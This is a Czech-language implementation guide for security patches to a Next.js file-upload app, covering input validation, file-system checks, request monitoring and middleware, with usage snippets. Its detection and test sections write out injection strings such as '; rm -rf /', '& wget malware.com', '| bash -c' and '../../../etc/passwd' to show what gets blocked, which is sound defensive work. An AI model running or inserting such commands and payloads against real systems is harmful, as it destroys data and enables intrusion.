# 🛡️ Advanced Security Patches - Implementation Guide

## Nově Přidané Bezpečnostní Vrstvy

### 1. **Input Validation & Injection Prevention** (`lib/inputValidation.js`)

Detekuje a blokuje:
- ✅ **SQL Injection** - detekce SQL příkazů v inputu
- ✅ **Command Injection** - detekce shell příkazů (rm, cat, bash, atd.)
- ✅ **Script Injection** - detekce `<script>` tagů a event handlerů
- ✅ **XSS Attacks** - detekce javascript: URL a data: protokolů
- ✅ **XXE Attacks** - detekce XML external entity
- ✅ **LDAP Injection** - detekce LDAP special characters
- ✅ **Path Traversal** - detekce `../` a `..\\` vzorů
- ✅ **Prototype Pollution** - detekce `__proto__`, `constructor`, `prototype`
- ✅ **Null Bytes** - detekce null byte injection

**Použití:**
```javascript
import { 
  sanitizeInput, 
  validateFilenameStrict, 
  parseJSONSafely 
} from '@/lib/inputValidation';

// Sanitizace uživatelského inputu
const cleanName = sanitizeInput(userInput);

// Striktní validace filename
const validation = validateFilenameStrict(filename);
if (!validation.valid) {
  console.log(`Invalid: ${validation.reason}`);
}

// Bezpečné parsování JSON
const { success, data } = parseJSONSafely(jsonString);
```

---

### 2. **File System Security** (`lib/fileSystemSecurity.js`)

Chrání před:
- ✅ **Symlink Following Attacks** - zabranění sledování symbolických odkazů
- ✅ **Hard Link Attacks** - prevence hard link vytváření
- ✅ **File Tampering** - ověřování integrity souborů
- ✅ **Secure Deletion** - víceprůchodová smazání (DOD standard)
- ✅ **Permission Escalation** - validace oprávnění souboru

**Použití:**
```javascript
import { 
  isSymlink, 
  validateNoSymlinks, 
  writeFileSecure, 
  deleteFileSecurely,
  getFileHash,
  verifyFileIntegrity 
} from '@/lib/fileSystemSecurity';

// Ověření symlink
if (isSymlink(filepath)) {
  console.log('Symlink detected!');
}

// Bezpečný zápis s atomicností
await writeFileSecure(filepath, data);

// Bezpečné smazání (3 průchody)
await deleteFileSecurely(filepath, 3);

// Hash pro integritu
const hash = getFileHash(filepath, 'sha256');
const isValid = verifyFileIntegrity(filepath, expectedHash);
```

---

### 3. **Request Security Monitoring** (`lib/requestSecurity.js`)

Monitoruje:
- ✅ **Attack Pattern Detection** - detekce znám ých útočných vzorů
- ✅ **HTTP Method Validation** - ověření povolených metod
- ✅ **Content-Type Validation** - kontrola typu obsahu
- ✅ **HTTP Response Splitting** - prevence vkládání CRLF
- ✅ **Header Injection** - ochrana před injektáží headerů
- ✅ **Double Encoding Attacks** - prevence bypass dekódování

**Použití:**
```javascript
import { 
  detectAttackPattern, 
  validateHTTPMethod,
  validateContentType,
  preventHeaderInjection 
} from '@/lib/requestSecurity';

// Detekce útoků
const patterns = detectAttackPattern(request, body);
if (patterns.length > 0) {
  console.log('Attack detected:', patterns);
}

// Validace HTTP metody
const method = validateHTTPMethod('POST', ['POST']);
if (!method.valid) {
  console.log('Invalid method');
}

// Ochrana headerů
if (!preventHeaderInjection(userProvidedHeader)) {
  console.log('Injection attempt');
}
```

---

### 4. **Advanced Middleware** (`middleware-advanced.js`)

Globální ochrana pro všechny požadavky:
- ✅ **Path Traversal Detection** - kontrola všech cest
- ✅ **Attack Pattern Analysis** - analýza těla požadavku
- ✅ **Security Headers** - přidání bezpečnostních headerů
- ✅ **Server Identification Removal** - skrytí informací o serveru
- ✅ **Suspicious Scanner Detection** - detekce security scannerů
- ✅ **No User-Agent Detection** - blokování bez identifikace

---

### 5. **Enhanced API Routes** 

Nové robustní verze s dodatečnými bezpečnostními kontrolami:

#### `app/api/upload/route-enhanced.js`
```javascript
// Přidané kontroly:
// - Ověření velikosti na základě Content-Length
// - Detekce podezřelého obsahu souboru
// - Generování SHA256 hashe
// - Atomické operace zápisu
// - Verifikace po zápisu
```

#### `app/api/files/[filename]/route-enhanced.js`
```javascript
// Přidané kontroly:
// - Validace symlinků na všech cestách
// - Detekce velikosti souboru
// - Bezpečné MIME typy
// - Datové toky s rate limitingem
```

---

## 📋 Implementace

### Krok 1: Aktivace Advanced Middleware

Nahraďte v `middleware.js`:

```javascript
// middleware.js
export { default } from './middleware-advanced.js';
```

Nebo přidejte dodatečné kontroly ke stávajícímu middleware:

```javascript
import { detectAttackPattern, handleSuspiciousRequest } from '@/lib/requestSecurity';

export async function middleware(request) {
  // Stávající kód...
  
  // Nový kód
  const patterns = detectAttackPattern(request, body);
  if (patterns.length > 0) {
    const result = handleSuspiciousRequest(request, patterns);
    if (result.block) {
      return NextResponse.json({ error: 'Access denied' }, { status: 403 });
    }
  }
}
```

### Krok 2: Aktivace Enhanced Upload Endpoint

Zvažte nahrazení původního uploadovacího endpointu:

```bash
# Backup původního
cp app/api/upload/route.js app/api/upload/route.js.backup

# Nahradit enhanced verzí
cp app/api/upload/route-enhanced.js app/api/upload/route.js
```

### Krok 3: Aktivace Enhanced File Operations

```bash
# Backup původního
cp app/api/files/[filename]/route.js app/api/files/[filename]/route.js.backup

# Nahradit enhanced verzí
cp app/api/files/[filename]/route-enhanced.js app/api/files/[filename]/route.js
```

---

## 🔍 Detekované Hrozby

### SQL Injection
```
Detekuje: ' OR 1=1--
Detekuje: ' UNION SELECT--
Detekuje: "; DROP TABLE--
```

### Command Injection
```
Detekuje: ; rm -rf /
Detekuje: & wget malware.com
Detekuje: | bash -c
```

### XSS/Script Injection
```
Detekuje: <script>alert('xss')</script>
Detekuje: javascript:void(0)
Detekuje: onerror=alert(1)
```

### Path Traversal
```
Detekuje: ../../../etc/passwd
Detekuje: ..\\..\\windows\\system32
Detekuje: %2e%2e%2f
```

### XXE (XML External Entity)
```
Detikuje: <!ENTITY xxe SYSTEM>
Detekuje: PUBLIC "-//DTD"
```

---

## 📊 Security Logging

Všechny bezpečnostní události jsou zaznamenány:

```json
{
  "timestamp": "2026-05-20T10:30:00.000Z",
  "eventType": "ATTACK_PATTERN_DETECTED",
  "patterns": ["SQL_INJECTION", "COMMAND_INJECTION"],
  "ip": "192.168.1.100",
  "url": "/api/upload",
  "blocked": true
}
```

---

## ⚙️ Konfigurace Limitů

V `lib/rateLimiter.js` upravit:

```javascript
// Upload: 1 request/minutu
const uploadLimiter = createRateLimiter(1, 60000);

// Files: 10 requests/minutu
const listLimiter = createRateLimiter(10, 60000);

// Operations: 5 requests/minutu
const fileLimiter = createRateLimiter(5, 60000);
```

---

## 🧪 Testování

### Test SQL Injection Detection
```bash
curl -X POST http://localhost:3000/api/upload \
  -H "x-admin-password: test" \
  -F "filename=test' OR '1'='1"
# Vrátí: 400 Invalid filename
```

### Test Command Injection Detection
```bash
curl -X POST http://localhost:3000/api/upload \
  -H "x-admin-password: test" \
  -F "filename=test; rm -rf /"
# Vrátí: 400 Invalid filename
```

### Test Path Traversal
```bash
curl -X POST http://localhost:3000/api/upload \
  -H "x-admin-password: test" \
  -F "filename=../../../etc/passwd"
# Vrátí: 400 Invalid path
```

---

## 📚 Bezpečnostní Referenece

- [OWASP Injection](https://owasp.org/www-community/Injection)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)

---

## ✅ Kontrola Bezpečnosti

Spusťte audit:

```bash
bash security-audit.sh
```

Očekávaný výstup:
```
✓ Input validation implemented
✓ File system security implemented
✓ Request security monitoring implemented
✓ Attack pattern detection enabled
✓ Rate limiting configured
```

---

## 🚀 Dalších Kroky

1. **Konfigurujte WAF** (Web Application Firewall)
   - ModSecurity + OWASP CRS
   - AWS WAF
   - Cloudflare WAF

2. **Implementujte IDS/IPS** (Intrusion Detection/Prevention)
   - Snort
   - Suricata

3. **Nastavte Monitoring**
   - ELK Stack (Elasticsearch, Logstash, Kibana)
   - Splunk
   - DataDog

4. **Pravidelné penetrační testy**
   - Automated SAST (Static Application Security Testing)
   - Manual code review
   - Red team exercises

---

**Aplikace je nyní chráněna proti nejčastějším útokům! ✅**
